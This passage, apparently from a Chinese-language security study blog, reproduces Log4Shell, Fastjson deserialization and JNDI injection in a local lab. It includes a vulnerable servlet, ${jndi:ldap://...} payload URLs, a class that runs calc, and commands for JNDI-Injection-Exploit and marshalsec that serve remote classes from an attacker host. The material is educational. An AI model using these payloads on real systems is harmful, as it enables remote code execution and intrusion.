class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.log4jwebdemo;<br>    <br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br>    <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br>    <br><span class="hljs-meta">@WebServlet(&quot;/log4j&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Log4jServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-comment">//构造HTTP WEB服务 使用带漏洞Log4j版本</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Logger log=LogManager.getLogger(Log4jServlet.class);<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span>req.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        log.error(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>,code);<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行 tomcat 服务器，访问 url 路由，添加 code 参数，最终构造 url 如下</p><p><a href="http://localhost:8080/Log4jWebDemo/_war/_exploded/log4j?code%5C=%5C$%7Bjava:os%7D">http://localhost:8080/Log4jWebDemo\_war\_exploded/log4j?code\=\${java:os}</a></p><p>此时产生一个400错误</p><p>​<img src="/assets/image-20240715181233-10u4fkt.png" alt="image">​</p><p>经过查询之后发现：Tomcat 服务器在解析请求时检测到了无效字符，从而返回了 HTTP 400 错误。这是因为 <strong>Tomcat 遵循 RFC 7230 和 RFC 3986 标准</strong>，这些标准规定了 URL 中允许的字符范围，而 <code>$&#123;&#125;</code>​ 这些字符在请求路径中是<strong>不允许</strong>的。</p><ul><li><p>这里一共有四个解决方法</p><p>方法一：对特殊字符进行 URL 编码</p><p>将 <code>$&#123;</code>​ 和 <code>&#125;</code>​ 等特殊字符进行 URL 编码，然后再进行访问。例如，<code>$&#123;</code>​ 编码为 <code>%24%7B</code>​，<code>&#125;</code>​ 编码为 <code>%7D</code>​。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=%24%7Bjava%3Aos%7D<br></code></pre></td></tr></table></figure><p>方法二：使用 POST 请求</p><p>有时使用 POST 请求可以避免这种问题，因为请求参数不包含在 URL 中，而是包含在请求体中。</p><p>可以创建一个简单的 HTML 表单来发送 POST 请求：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST Request<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://localhost:8080/Log4jWebDemo_war_exploded/log4j&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;code&quot;</span>&gt;</span>Enter code:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;code&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;code&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;java:os&#125;&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将此 HTML 文件保存并在浏览器中打开，然后提交表单。</p><p>方法三：修改 Tomcat 配置（不推荐）</p><p>不推荐在生产环境中进行此类配置更改，因为它会降低安全性。但在受控环境中进行测试时，可以修改 Tomcat 的 <code>web.xml</code>​ 文件以允许特殊字符：</p><ol><li><p>打开 <code>conf/web.xml</code>​ 文件。</p></li><li><p>添加以下内容：</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.catalina.filters.SetCharacterEncodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>encoding<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>ignore<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><p>方法四：使用代理或自定义客户端</p><p>使用代理服务器或编写自定义 HTTP 客户端可以绕过浏览器和服务器的限制。</p><p>使用 cURL 发送请求</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -G <span class="hljs-string">&quot;http://localhost:8080/Log4jWebDemo_war_exploded/log4j&quot;</span> --data-urlencode <span class="hljs-string">&quot;code=\$&#123;java:os&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>自定义 HTTP 客户端（Java 示例）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8080/Log4jWebDemo_war_exploded/log4j&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        con.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        con.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>);<br>        con.setDoOutput(<span class="hljs-literal">true</span>);<br>    <br>        <span class="hljs-type">String</span> <span class="hljs-variable">postData</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;code=$&#123;java:os&#125;&quot;</span>;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> con.getOutputStream()) &#123;<br>            <span class="hljs-type">byte</span>[] input = postData.getBytes(StandardCharsets.UTF_8);<br>            os.write(input, <span class="hljs-number">0</span>, input.length);<br>        &#125;<br>    <br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> con.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;POST Response Code :: &quot;</span> + responseCode);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>所以,此时需要对这些不允许的特殊字符进行url编码，构造出新的url</p><p><a href="http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=$%7Bjava:os%7D">http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=%24%7Bjava%3Aos%7D</a></p><p>成功执行</p><p>​<img src="/assets/image-20240715181732-ajm1k14.png" alt="image">​</p></li><li><p>JNDI注入</p><p>利用 JNDI-ldap 执行命令</p><p>使用 JNDI 注入工具生成远程可访问的调用方法 (这里用的是 JNDIExploit)</p><p>也就是 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p><p>使用命令如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">java -jar JNDI-Injection-Exploit-<span class="hljs-number">1.0</span>-SNAPSHOT-all.jar -C <span class="hljs-string">&quot;notepad&quot;</span> -A <span class="hljs-number">192.168</span><span class="hljs-number">.88</span><span class="hljs-number">.142</span><br>                                                        要执行的命令      服务器ip<br></code></pre></td></tr></table></figure><p>​<img src="/assets/image-20240715191829-xp7v92p.png" alt="image">​</p><p>这里根据自己的jdk判断需要使用<code>ldap://192.168.88.142:1389/etrd1z</code>​</p><p>使用JNDI注入则为<code>jndi:ldap://192.168.88.142:1389/etrd1z</code>​</p><p>code的值就为<code>$&#123;jndi:ldap://192.168.88.142:1389/etrd1z&#125;</code>​</p><p>构造url:</p><p><a href="http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=$%7Bjndi:ldap://192.168.88.142:1389/etrd1z%7D">http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=${jndi:ldap://192.168.88.142:1389/etrd1z}</a></p><p>经过url编码后得到</p><p><a href="http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=$%7Bjndi:ldap://192.168.88.142:1389/etrd1z%7D">http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=%24%7Bjndi%3Aldap%3A%2F%2F192.168.88.142%3A1389%2Fetrd1z%7D</a></p><p>最后成功执行！</p><p>​<img src="/assets/image-20240715193045-q3x4hn4.png" alt="image">​</p><p>​<img src="/assets/image-20240715194834-vu46q1s.png" alt="image">​</p></li></ul></li><li><p>Fastjson</p><ol><li><p>Maven引用Fastjson</p><p> <img src="/assets/image-20240715234653-ppk0ehy.png" alt="image">​</p><p> <img src="/assets/image-20240715234701-waz6x5l.png" alt="image">​</p><p> <img src="/assets/image-20240715234711-u9ny4p5.png" alt="image">​</p><p> User.java</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.suyou;<br>        <br><span class="hljs-comment">// 给fastjson数据转换测试用的</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>        <br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>   &#125;<br>        <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>   &#125;<br>        <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        System.out.println(age);<br>   &#125;<br>        <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        System.out.println(name);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> FastjsonTest.java</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.suyou;<br>        <br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br>        <br><span class="hljs-comment">// 使用Fastjson去除了User类数据</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// u Object对象</span><br>        <span class="hljs-comment">// Integer age String name 数据</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        u.setAge(<span class="hljs-number">20</span>);<br>        u.setName(<span class="hljs-string">&quot;SuYou&quot;</span>);<br><span class="hljs-comment">//       System.out.println(u);</span><br>        <br>        <span class="hljs-comment">// 把数据转换为Json格式数据，不想用自带的API（太麻烦）</span><br>        <span class="hljs-comment">// 所以使用Fastjson来进行数据转换</span><br>        <span class="hljs-comment">// 将json对象转化为json数据</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(u);<br>        System.out.println(<span class="hljs-string">&quot;这就是json格式：&quot;</span>+jsonString);<br>        <br>        <span class="hljs-comment">// 分析漏洞利用 多输出 转换数据类型 其实前面有一个@type转换对象类包</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString1</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(u, SerializerFeature.WriteClassName);<br>        System.out.println(<span class="hljs-string">&quot;这就是json格式：&quot;</span>+jsonString1);<br>        <br>        <span class="hljs-comment">// 上面是   对象 -&gt; JSON</span><br>        <br>        <span class="hljs-comment">// 下面是   JSON -&gt; 对象</span><br>        <span class="hljs-comment">// String test = &quot;&#123;\&quot;@type\&quot;:\&quot;com.suyou.User\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;SuYou\&quot;&#125;&quot;;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.suyou.Run\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;SuYou\&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 实战中com.suyou.Run 我们不知道 所以一般固定调用java自带的一些包</span><br>        <span class="hljs-comment">// rmi ldap 去触发远程的class 执行代码（RCE）</span><br>        <br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(test);<br>        System.out.println(jsonObject);<br>        <br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> Run.java</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.suyou;<br>        <br><span class="hljs-keyword">import</span> java.io.IOException;<br>        <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Run</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>运行 FastjsonTest.java，会进行序列化和反序列化过程，会将 User 对象序列化转换为 Json，后面会将 Json 反序列化转换回对象，此时，我们发现在反序列化转换回对象时，可以显示对象包名，我们可以通过修改包名来改变反序列化回的对象。</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.xiaodi.User\&quot;,\&quot;age\&quot;:30,\&quot;name\&quot;:\&quot;xiaodi\&quot;&#125;&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.xiaodi.Run\&quot;,\&quot;age\&quot;:30,\&quot;name\&quot;:\&quot;xiaodi\&quot;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p> 如上面两个 json，第二个将原本的 User 换为了我们自己写的 Run 对象，而 Run 对象中被我们写入了恶意代码，后续过程将 test 进行了反序列化操作，将 json 反序列化为对象时构造了 Run 对象，执行了其中构造函数的恶意代码，弹出了计算器。</p><p> 但是在实战过程中，我们不知道 comsuyoo.RUn ，我们无法确定人家哪个包可以用，所以一般固定调用 java 自带的一些包，很多复现都能看到，然后使用 rmi ldap 去触发远程的 class 执行代码（RCE）<br> Fastjson 漏洞复现：<a href="https://blog.csdn.net/guo15890025019/article/details/120532891" title="Fastjson漏洞复现_fastjson 1.2.84-CSDN博客">Fastjson漏洞复现_fastjson 1.2.84-CSDN博客</a></p></li></ol></li></ol><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h3 id="JavaEE应用-JNDI注入-RMI服务-LDAP服务-JDK绕过-调用链类"><a href="#JavaEE应用-JNDI注入-RMI服务-LDAP服务-JDK绕过-调用链类" class="headerlink" title="JavaEE应用&amp;JNDI注入&amp;RMI服务&amp;LDAP服务&amp;JDK绕过&amp;调用链类"></a>JavaEE应用&amp;JNDI注入&amp;RMI服务&amp;LDAP服务&amp;JDK绕过&amp;调用链类</h3><p><strong>&#x3D;&#x3D;注意！！！你的服务器和主机的jdk版本必须一致，这里使用的是jdk8u112&#x3D;&#x3D;</strong></p><ol><li><p>JNDI远程调用-JNDI-Injection</p><p> 1、使用远程调用(默认端口1389)<br> 调用rmi ldap等服务对象类，远程地址的一个class文件被执行</p><p> 示例：</p><p> new InitialContext().lookup(“ldap:&#x2F;&#x2F;xx.xx.xx.xx:1389&#x2F;Test”);<br> new InitialContext().lookup(“rmi:&#x2F;&#x2F;xx.xx.xx.xx:1099&#x2F;Test”);</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.jndi;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;rmi://192.168.88.142:1099/spaum9&quot;</span>);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;ldap://192.168.88.142:1389/spaum9&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 2、使用利用工具生成调用地址<br> 创建一个rmi ldap等服务调用 实例化<br> java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “calc” -A xx.xx.xx.xx</p><p> 上面这条命令里的-C意味着执行其class文件</p><p> <img src="/assets/image-20240717112421-dfcvygv.png" alt="image">​</p><p> <img src="/assets/image-20240717112635-mssiiqp.png" alt="image">​</p></li><li><p>JNDI远程调用-marshalsec</p><p> 1 、使用远程调用 ( 默认端口 1389 )</p><p> 示例：<br> new InitialContext().lookup(“ldap:&#x2F;&#x2F;xx.xx.xx.xx:1389&#x2F;Test”);<br> new InitialContext().lookup(“rmi:&#x2F;&#x2F;xx.xx.xx.xx:1099&#x2F;Test”);</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.jndi;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;rmi://192.168.88.142:1099/spaum9&quot;</span>);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;ldap://192.168.88.142:1389/spaum9&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 2、创建并编译调用对象</p><p> 创建Test.java</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;notepad&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 打开终端并进行编译</p><p> <img src="/assets/image-20240717113508-lkcc7ma.png" alt="image">​</p><p> <img src="/assets/image-20240717113825-n6wq7cr.png" alt="image">​</p><p> 3、将编译后的Class文件存放到攻击机中，这里使用的是虚拟机作为攻击机，也可以使用云服务器（自己搭建）或者在主机使用python2 -m SimpleHTTPServer启动一个小型服务器</p><p> <img src="/assets/image-20240717115033-dwgamxr.png" alt="image">4、使用工具生成调用协议，并执行代码</p><ul><li><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.88.142/#Test</code>​</p><p><img src="/assets/image-20240717120406-czb4q1b.png" alt="image">​</p></li><li><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.88.142/#Test</code>​<br>​<img src="/assets/image-20240717120750-zjkbym4.png" alt="image">​</p></li></ul></li><li><p>JNDI注入-FastJson漏洞结合</p><p> 1、创建对应的FastJson项目</p><p> <img src="/assets/image-20240717121151-8net82k.png" alt="image">​</p><p> 2、搭建漏洞环境</p><p> <img src="/assets/image-20240717121504-k6euxqx.png" alt="image">​</p><p> <img src="/assets/image-20240717121641-vbk0d97.png" alt="image">​</p><p> <img src="/assets/image-20240717121913-6k56z03.png" alt="image">​</p><p> <img src="/assets/image-20240717122010-iqcdgui.png" alt="image">​</p><p> 3、生成远程调用方法</p><p> java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “calc” -A 192.168.88.142</p><p> <img 